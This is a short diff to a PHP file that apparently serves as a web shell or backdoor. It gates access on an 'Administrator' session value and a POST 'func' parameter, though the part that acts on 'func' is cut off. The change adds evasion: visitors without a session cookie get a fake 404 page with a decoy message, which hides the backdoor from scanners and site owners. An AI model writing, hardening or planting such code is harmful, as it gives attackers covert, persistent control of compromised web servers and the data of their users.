@@ -1,6 +1,10 @@
 <?php
 /* Powered By c4e3bac3@foxmail.com  Hello */
-session_start();
+if (!isset($_COOKIE[session_name()])) {
+    http_response_code(404);
+    echo "<br/><center><br/><h1> Crazy Thursday vivo 50 ! </h1></center>";exit();
+}
+session_start(['cookie_httponly' => true]);
 
 if (isset($_SESSION["Administrator"]) && $_SESSION["Administrator"] === "Administrator") {
     if (isset($_POST["func"])) {
